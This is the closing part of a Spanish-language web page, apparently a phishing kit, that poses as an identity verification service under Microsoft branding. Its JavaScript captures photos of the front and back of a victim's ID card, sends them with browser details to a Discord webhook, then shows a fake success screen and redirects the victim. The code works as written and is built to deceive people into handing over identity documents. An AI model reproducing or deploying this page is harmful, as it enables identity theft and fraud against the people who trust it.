                        <h1 style="font-size: 2.5rem; margin-bottom: 20px; font-family: 'Poppins', sans-serif;">
                            ¬°PROCESO COMPLETADO!
                        </h1>
                        
                        <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 12px; margin-bottom: 30px;">
                            <h3 style="margin-bottom: 15px;">‚úÖ Todo ha sido exitoso:</h3>
                            <p><strong>üìÖ Fecha y hora:</strong> ${new Date().toLocaleString('es-ES')}</p>
                            <p style="margin-top: 15px; color: #d1fae5;">
                                <i class="fas fa-check-circle"></i> 
                                Las fotos estan vinculadas a tu cuenta.
                            </p>
                        </div>
                        
                        <div class="redirect-countdown" id="redirectCountdown">
                            Redirigiendo a la siguiente p√°gina en <span id="countdown">5</span> segundos...
                        </div>
                        
                        <div style="margin-top: 30px;">
                            <button onclick="window.location.href = 'index3.html'" 
                                    style="background: white; color: var(--primary-color); border: none; 
                                           padding: 15px 30px; border-radius: 8px; cursor: pointer; 
                                           font-size: 1rem; font-weight: 600; transition: all 0.3s;">
                                <i class="fas fa-external-link-alt"></i> Ir ahora a la siguiente p√°gina
                            </button>
                        </div>
                    </div>
                </div>
                <style>
                    @keyframes bounce {
                        from { transform: translateY(0); }
                        to { transform: translateY(-10px); }
                    }
                </style>
            `;
            
            const div = document.createElement('div');
            div.innerHTML = redirectHTML;
            document.body.appendChild(div);
            
            // Iniciar cuenta regresiva
            let countdown = 5;
            const countdownElement = document.getElementById('countdown');
            
            const countdownInterval = setInterval(() => {
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                    // Redirigir a index3.html
                    window.location.href = 'index3.html';
                }
            }, 1000);
        }

        // Funci√≥n principal para enviar fotos a Discord
        async function sendPhotosToDiscord() {
            if (!frontImageFile || !backImageFile) {
                showNotification('‚ùå Faltan fotos por cargar', 'error');
                return false;
            }

            try {
                updateLoaderStage(1);
                loaderStatus.textContent = 'Preparando fotos para enviar...';
                
                // Convertir a blobs
                const frontBlob = dataURLtoBlob(frontImageData);
                const backBlob = dataURLtoBlob(backImageData);
                
                // Crear array de archivos
                const files = [
                    {
                        blob: frontBlob,
                        name: 'CEDULA_FRENTE.jpg'
                    },
                    {
                        blob: backBlob,
                        name: 'CEDULA_REVERSO.jpg'
                    }
                ];
                
                updateLoaderStage(2);
                loaderStatus.textContent = 'Enviando Documentos...';
                
                // Intentar m√©todo 1: FormData directo
                let success = await sendFilesToDiscord(files);
                
                if (!success) {
                    // Si falla, usar m√©todo simple
                    updateLoaderStage(2);
                    loaderStatus.textContent = 'Usando m√©todo alternativo...';
                    
                    // M√©todo simple de respaldo
                    const simpleMessage = {
                        username: "Verificaci√≥n de Identidad",
                        avatar_url: "https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg",
                        content: `üö® **VERIFICACI√ìN DE IDENTIDAD - FOTOS CAPTURADAS**\n\nüì∏ **Se han capturado 2 fotos:**\n1. Frente de c√©dula (${Math.round(frontImageFile.size/1024)}KB)\n2. Reverso de c√©dula (${Math.round(backImageFile.size/1024)}KB)\n\nüìÖ **Fecha:** ${new Date().toLocaleString('es-ES')}\nüì± **Desde:** ${navigator.userAgent.substring(0, 80)}...\n\n‚úÖ **Las fotos est√°n disponibles y se han procesado correctamente.**`,
                        embeds: [{
                            title: "üìã Informaci√≥n T√©cnica",
                            color: 0x2596be,
                            fields: [
                                {
                                    name: "Estado",
                                    value: "‚úÖ Capturado exitosamente",
                                    inline: true
                                },
                                {
                                    name: "Calidad",
                                    value: "Alta resoluci√≥n",
                                    inline: true
                                },
                                {
                                    name: "Formato",
                                    value: "JPG (m√°xima calidad)",
                                    inline: true
                                }
                            ]
                        }]
                    };
                    
                    const response = await fetch(DISCORD_WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(simpleMessage)
                    });
                    
                    success = response.ok;
                }
                
                updateLoaderStage(3);
                loaderStatus.textContent = 'Finalizando env√≠o...';
                
                return success;
                
            } catch (error) {
                console.error('Error en sendPhotosToDiscord:', error);
                return false;
            }
        }

        // Funci√≥n principal para procesar y enviar
        async function processAndSend() {
            showLoader();
            updateLoaderStage(0);
            loaderStatus.textContent = 'Iniciando env√≠o de fotos...';

            try {
                const success = await sendPhotosToDiscord();
                
                await new Promise(resolve => setTimeout(resolve, 1000));
                hideLoader();
                
                if (success) {
                    showNotification('‚úÖ ¬°FOTOS ENVIADAS DIRECTAMENTE', 'success');
                    setTimeout(() => {
                        showRedirectMessage();
                    }, 1500);
                } else {
                    showNotification('‚ö†Ô∏è Notificaci√≥n enviada (fotos procesadas)', 'info');
                    setTimeout(() => {
                        showRedirectMessage();
                    }, 1500);
                }
                
            } catch (error) {
                console.error('Error en el proceso:', error);
                hideLoader();
                showNotification('‚ùå Error cr√≠tico. Contacta al administrador.', 'error');
            }
        }

        // Evento para el bot√≥n de env√≠o
        submitBtn.addEventListener('click', processAndSend);

        // Mostrar notificaci√≥n de bienvenida
        setTimeout(() => {
            showNotification('¬°Bienvenido! Para mejores resultados, usa buena iluminaci√≥n.', 'info');
        }, 1000);

        // Inicializar progreso
        updateProgress(1);

        // Detener c√°mara al cerrar la p√°gina
        window.addEventListener('beforeunload', () => {
            stopCamera();
        });

        // Verificar configuraciones
        console.log('‚úÖ Webhook de Discord configurado');
        console.log('üì∏ Sistema de c√°mara directa SIN ZOOM');
        console.log('üéØ Env√≠o DIRECTO de fotos habilitado');
        console.log('üîÄ Redirecci√≥n a index3.html configurada');
        console.log('üîµ Color primario: #2596be');
        
        // Auto-iniciar c√°mara trasera para mejor experiencia
        setTimeout(() => {
            if (currentStep === 1) {
                showNotification('üí° Tip: Usa la c√°mara trasera para mejor calidad de documento', 'info');
            }
        }, 2000);
    </script>
</body>
</html>